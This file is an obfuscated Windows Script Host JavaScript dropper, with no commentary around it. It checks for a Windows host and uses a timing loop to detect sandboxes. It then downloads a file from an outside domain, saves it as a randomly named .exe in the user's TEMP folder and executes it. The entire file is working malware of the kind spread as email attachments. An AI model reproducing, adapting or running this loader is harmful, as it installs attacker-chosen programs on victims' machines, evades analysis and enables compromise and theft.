var _O0 = false;
var _S = "CreateObject";
var _YY = function _H() {return WScript[_S]("WScript"+".Shell");}(), _YN = 11;
var _B0 = "MSXML2.XMLHTTP";
var _U0 = 2123213;
var _X0 = 0;
function _DI(_E){_YY["Run"](_E, _X0, _X0);};
function _CL(){return _B0 + "";};
function _V(_GI, _DL){_X0 = _X0 * 1; return _GI - _DL;};
function _YI(){return _S;};
/*@cc_on
  @if (@_win32 || @_win64)
    _O0 = true;
  @end
@*/
if (_O0)
{
var _Q = "";
function _O(){return 22;};
var _Z = 0; var _T = 0;
function _U()
{
var _SF = new this["Date"]();
var _GD = _SF["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _SF = new this["Date"]();
var _OL = _SF["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _SF = new this["Date"]();
var _R = _SF["getUTCMilliseconds"]();
var _Z = "_Y";
_Z = _V(_OL, _GD);
var _T = "_S0";
_T = _V(_R, _OL);
_Q = "open";
return _V(_Z, _T);
}
var _R0 = false;
var _S1 = false;
for (var _B = _X0; _B < _O() * 1; _B++){if (_U() != _X0){
_R0 = true; 
_T = "31" + 11 * _Z + _T; 
_S1 = true; 
break;
}}
function _X() {return ((_R0 == true) && (_R0 == _S1)) ? 1 : _X0;};
if (_R0 && _X() && _S1){
function _KG() {return _YY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2UVGtRiEBI2oZZp.ex" + "e";};
 _E0 = _CL();
 _QH = WScript[_S](_E0);
 var _VV = 1;
 while (_VV){
try {
	if (_VV == 1)
	{
		_QH[_Q]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_QH["send"]();
		_DB = "Sleep";
	}
	WScript[_DB](_O() + 120); 
	if (_QH["readystate"] < 2 * 2) continue;
	_VV = _X0;
	function _GG(_IK) {var _AH = (1, 2, 3, 4, 5, _IK); return _AH;};
	_K = WScript[_YI()]("ADODB.Stream");
	_E0 = _K;
	_E0[_Q]();
	_E0["type"] = _GG(1);
	_E0["write"](_QH["ResponseBody"]);
	_K["position"] = _GG(_X0);
	_E0["Save" + "ToFile"](_KG(), 2);
	_K["cl"+"ose"]();
	_TW = _KG();
	_DI(_TW);
} catch(_WF){};
}
}
}

